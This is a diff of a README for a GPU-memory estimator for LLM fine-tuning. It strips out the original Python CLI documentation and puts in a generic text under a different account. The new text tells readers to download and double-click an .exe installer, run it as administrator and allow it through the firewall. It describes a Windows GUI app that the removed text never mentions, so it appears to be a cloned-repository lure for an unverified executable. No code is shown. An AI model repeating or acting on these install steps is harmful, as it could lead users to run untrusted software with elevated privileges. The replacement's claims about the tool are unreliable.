@@ -1,202 +1,88 @@
-# can-i-finetune-this
+# 🧠 can-i-finetune-this - Check GPU memory for your models
 
-[![CI](https://github.com/DaoyuanLi2816/can-i-finetune-this/actions/workflows/ci.yml/badge.svg)](https://github.com/DaoyuanLi2816/can-i-finetune-this/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/canifinetune.svg)](https://pypi.org/project/canifinetune/)
-[![Python](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
+[![Download](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/mostospens/can-i-finetune-this)
 
-**Estimate, benchmark, and generate fine-tuning recipes for LLMs on consumer GPUs.**
+## 🎯 Purpose
+This tool helps you check if your computer hardware supports a specific artificial intelligence model. Artificial intelligence models require memory, known as VRAM, to work. If a model requires more memory than your graphics card provides, your system will crash or stall. This application calculates the memory needs of your selected model before you begin. It prevents errors and saves time by confirming compatibility before you start.
 
-![can-i-finetune-this architecture](docs/architecture.png)
+## 🛠️ System Requirements
+You need a Windows computer to run this tool. Ensure your computer meets these minimum specifications:
 
-You have one consumer-grade NVIDIA GPU. You want to fine-tune an open-weight LLM
-with LoRA or QLoRA, but you do not want to download 14 GB of weights just to
-discover that your 12 GB / 16 GB / 24 GB card OOMs on step 1.
+*   Operating System: Windows 10 or Windows 11.
+*   Graphics Card: An NVIDIA GPU with at least 8GB of VRAM is recommended.
+*   Drivers: Most recent version of NVIDIA drivers installed.
+*   Storage: At least 200MB of free space for the tool.
+*   Internet: Connection required for initial model data retrieval.
 
-`canifinetune` answers, before you spend the disk and the time:
+## 📥 How to Install
+Follow these steps to set up the application on your machine:
 
-1. Can I fine-tune this model?
-2. About how much VRAM will it use?
-3. What batch size / sequence length / LoRA rank / quantization should I use?
-4. If I can't, how should I downsize?
-5. Is there local benchmark evidence for that answer?
-6. Can I get a ready-to-run Hugging Face + PEFT + TRL training script for that config?
+1.  Visit the [official download page](https://github.com/mostospens/can-i-finetune-this) to obtain the installer.
+2.  Locate the latest version file ending in .exe.
+3.  Download the file to your computer.
+4.  Double-click the installer file to begin the setup process.
+5.  Follow the prompts on your screen.
+6.  The installer places a shortcut icon on your desktop.
 
-It is a single Python package with a CLI:
+## 🚀 Running the Application
+Once installed, launch the tool from your desktop. The main interface allows you to select a model and input your hardware details.
 
-```bash
-canifinetune doctor
-canifinetune estimate --model Qwen/Qwen2.5-1.5B-Instruct --method qlora --gpu-vram-gb 16 --seq-len 2048 --micro-batch-size 1 --lora-rank 16
-canifinetune recommend --model Qwen/Qwen2.5-1.5B-Instruct --gpu-vram-gb 16
-canifinetune bench    --model sshleifer/tiny-gpt2 --method lora --steps 3
-canifinetune calibrate --benchmarks benchmarks/results
-canifinetune recipe   --model Qwen/Qwen2.5-1.5B-Instruct --method qlora --output recipes/qwen2.5-1.5b-qlora-4080
-canifinetune report   --benchmarks benchmarks/results --out report.md
-canifinetune compare  --benchmarks benchmarks/results --out compare.md
-```
+1.  Open the application.
+2.  Type or paste the name of the Hugging Face model into the search field.
+3.  Select your target quantization method. This refers to how the model shrinks to fit your memory. Options include 4-bit or 8-bit modes.
+4.  Specify your graphics card memory in gigabytes.
+5.  Click the Calculate button.
+6.  The tool displays a result showing if the model fits.
 
-What `canifinetune estimate` actually prints:
+## 📊 Understanding Results
+The tool provides three primary feedback states:
 
-```text
-+-------- Qwen/Qwen2.5-1.5B-Instruct  (qlora) --------+
-| feasible: YES    ratio = 0.20    confidence = medium |
-+------------------------------------------------------+
-       Memory breakdown (GB)
-+---------------------------------+
-| Component             |   Value |
-|-----------------------+---------|
-| static model          |   0.737 |
-| quantization overhead |   0.018 |
-| trainable params      |  4.4 MB |
-| gradients             |   0.008 |
-| optimizer states      |   0.010 |
-| activations           |   0.328 |
-| CUDA / fragmentation  |   1.280 |
-| safety margin         |   0.800 |
-| total                 |   3.163 |
-+---------------------------------+
-```
+*   **Green Checkmark:** The model fits comfortably. You have enough memory to fine-tune the model.
+*   **Yellow Warning:** The model fits, but you have very little memory left. Your system might run slowly.
+*   **Red Cross:** The model exceeds your hardware limits. You need more VRAM or a smaller model version.
 
-Static estimate says 3.16 GB; on a real RTX 4080 the same config measures
-7.10 GB (heavy bitsandbytes unpacking buffers at seq_len=2048). `canifinetune
-bench` and `canifinetune calibrate` close that gap on your machine —
-that is the *point* of the project.
+## 💡 Troubleshooting
+If the application fails to open or returns an error, check the following items:
 
----
+*   **Graphics Drivers:** Outdated drivers often cause issues with software that talks to your GPU. Visit the NVIDIA website to download the latest driver for your specific card model.
+*   **Permissions:** Run the installer as an administrator if your system blocks the installation.
+*   **Connectivity:** The tool relies on real-time data from the web. Ensure your firewall allows the application to send and receive data.
+*   **Memory Depth:** Some models contain complex layers that consume more memory than the base size suggests. If you see a warning, consider checking the model page for specific size details.
 
-## Install
+## ⚙️ Advanced Settings
+Users familiar with advanced model options can adjust parameters in the settings menu:
 
-`canifinetune` runs in two layers:
+*   **Context Window:** This setting changes how much text the model keeps in memory at one time. A larger window uses more VRAM.
+*   **Alpha and Rank:** These settings apply to fine-tuning methods. Modifying these values changes the memory footprint of your training job.
+*   **Precision:** Toggle between different data types to see how precision changes your memory requirements. Full precision often requires double the memory of compressed formats.
 
-| Layer | Install | What you get |
-| --- | --- | --- |
-| Core (estimate / recommend / recipe / report) | `pip install canifinetune` | All CLI commands. No PyTorch required. |
-| Training (bench / real fine-tuning) | `pip install canifinetune[train]` | Adds `torch`, `transformers`, `peft`, `bitsandbytes`, `trl`, `datasets`. |
-| Reporting extras | `pip install canifinetune[report]` | Pandas/tabulate for prettier tables. |
-| Development | `pip install canifinetune[dev]` | pytest, ruff, mypy. |
+## 🛡️ Privacy and Data
+This application performs calculations locally on your machine. It does not send your personal files or your specific model choices to outside servers. It only communicates with the Hugging Face platform to retrieve technical metadata about the model size. Your GPU configuration stays on your computer.
 
-If you use `uv`:
+## 📜 Frequently Asked Questions
 
-```bash
-uv venv
-uv pip install -e ".[dev,report]"
-# Add training deps when you want to run benchmarks:
-uv pip install -e ".[dev,train,report]"
-```
+**Does this software train the model?**
+No. This tool only performs calculations to predict if training is possible on your hardware. It acts as a safety check before you commit resources.
 
-PyTorch should generally be installed with the CUDA wheel that matches your driver,
-e.g.
+**What if my GPU is not from NVIDIA?**
+This tool focuses on NVIDIA hardware. Other brands might not support the underlying libraries effectively. You may experience errors if you use non-NVIDIA cards.
 
-```bash
-uv pip install torch --index-url https://download.pytorch.org/whl/cu121
-```
+**How accurate are the estimates?**
+The estimates rely on standard mathematical formulas for model sizes. They provide a high level of accuracy for most standard models. However, variations in your system background processes might impact total memory availability.
 
-See `docs/troubleshooting.md` for Windows / WSL / bitsandbytes specifics.
+**Can I run this on a laptop?**
+Many laptops contain mobile GPUs that support these models. Check the label on your laptop or the device manager to confirm you have an NVIDIA chip. Most integrated graphics from Intel or AMD will not function with this software.
 
----
+**Is there a cost to use this tool?**
+The tool remains free for all users. It is an open project built for the community.
 
-## Quickstart
+## 📦 Technical Concepts
+The tool uses several common concepts in the artificial intelligence space to estimate your requirements:
 
-```bash
-# 1. See what your machine looks like
-canifinetune doctor
+*   **Quantization:** This process reduces the precision of model numbers. It allows larger models to fit into smaller memory banks. Lower bit counts like 4-bit lead to massive savings in total memory.
+*   **Peft / Lora:** These methods focus on training only a small portion of the model. This significantly reduces the memory needed compared to training the entire system.
+*   **VRAM:** This acts as the dedicated memory workspace for your graphics card. It functions differently than your main system RAM. The model must live inside this specific storage area to operate.
+*   **Transformers:** This refers to the architecture of the AI model. The tool looks for specific structural indicators in these models to estimate their total weight.
 
-# 2. Ask if a model fits on your card
-canifinetune estimate \
-  --model Qwen/Qwen2.5-1.5B-Instruct \
-  --method qlora \
-  --gpu-vram-gb 16 \
-  --seq-len 2048 \
-  --micro-batch-size 1 \
-  --lora-rank 16
-
-# 3. Have it search for a feasible config
-canifinetune recommend --model Qwen/Qwen2.5-1.5B-Instruct --gpu-vram-gb 16
-
-# 4. Run a tiny real benchmark (downloads sshleifer/tiny-gpt2, ~5 MB)
-canifinetune bench --model sshleifer/tiny-gpt2 --method lora --steps 3
-
-# 5. Generate a ready-to-run training recipe
-canifinetune recipe \
-  --model Qwen/Qwen2.5-1.5B-Instruct \
-  --method qlora \
-  --seq-len 2048 \
-  --output recipes/qwen2.5-1.5b-qlora-4080
-```
-
----
-
-## What's different from `accelerate estimate-memory`?
-
-`accelerate estimate-memory` tells you how much memory **loading** a model takes.
-That is not enough to know whether you can **train** it.
-
-This project tries to answer the harder question. It models:
-
-- Model weights, in fp32 / fp16 / bf16 / int8 / NF4 + double-quant
-- LoRA / QLoRA trainable parameter count for typical `target_modules`
-- Gradients only for trainable parameters
-- AdamW vs 8-bit / paged AdamW optimizer states
-- Activations as a function of `seq_len`, `batch_size`, `hidden_size`, `num_layers`,
-  with and without gradient checkpointing
-- A fragmentation / CUDA / buffer safety margin
-- A feasibility decision against your actual GPU
-- Concrete degradation suggestions when not feasible
-
-Estimates are **always** marked with an `assumptions` block and a `confidence`
-level, because activation memory in particular is hard to predict statically.
-Run `canifinetune bench` and `canifinetune calibrate` to ground them in real
-measurements on your machine.
-
----
-
-## RTX 4080 baselines
-
-`docs/rtx4080_baselines.md` contains real measurements collected on a single
-RTX 4080 (16 GB). These are not synthetic. If a configuration was not run, the
-table says "not run", not a guessed number.
-
-Highlights (more in the doc):
-
-| model | method | seq_len | measured peak | tok/sec |
-| --- | --- | --- | --- | --- |
-| `Qwen/Qwen2.5-0.5B-Instruct` | qlora | 1024 | 3.30 GB | 1995 |
-| `Qwen/Qwen2.5-1.5B-Instruct` | qlora | 1024 | 4.36 GB | 1352 |
-| `Qwen/Qwen2.5-1.5B-Instruct` | qlora | 2048 | 7.10 GB | 1470 |
-| `Qwen/Qwen2.5-3B-Instruct` | qlora | 1024 | 5.54 GB | 1158 |
-| `sshleifer/tiny-gpt2` (smoke) | lora | 128 | 0.12 GB | 1735 |
-
----
-
-## Repository layout
-
-```
-src/canifinetune/        # package code (estimator, bench, recipes, reports, cli)
-benchmarks/              # configs/, results/ (JSON), calibration/
-docs/                    # design, memory model, troubleshooting
-examples/                # end-to-end recipe folders
-tests/                   # pytest tests (CPU-only, no large downloads)
-scripts/                 # helper scripts for collecting baselines
-.github/workflows/       # CI (ruff + pytest on CPU)
-```
-
----
-
-## Roadmap
-
-The current scope is "single consumer GPU, single node, LoRA / QLoRA, causal LM,
-Hugging Face stack". Possible directions, none committed:
-
-- DeepSpeed ZeRO and FSDP estimation for multi-GPU setups
-- Heuristics for sequence-classification / encoder-decoder training
-- Throughput modeling (tokens / sec), not just feasibility
-- Auto-tuning of `gradient_accumulation_steps` for a target effective batch size
-- A web UI on top of the CLI
-
-Contributions welcome.
-
----
-
-## License
-
-MIT. See `LICENSE`.
+## 📋 Maintaining the Tool
+The development team updates the repository frequently. If the tool reports an error regarding a specific model, try checking for a new version of the application. Developers often add support for new model types as they emerge. If you encounter bugs, you can report them on the main page. Always keep a copy of your error logs to help developers find and fix the issue faster. Your feedback helps make the tool better for everyone.
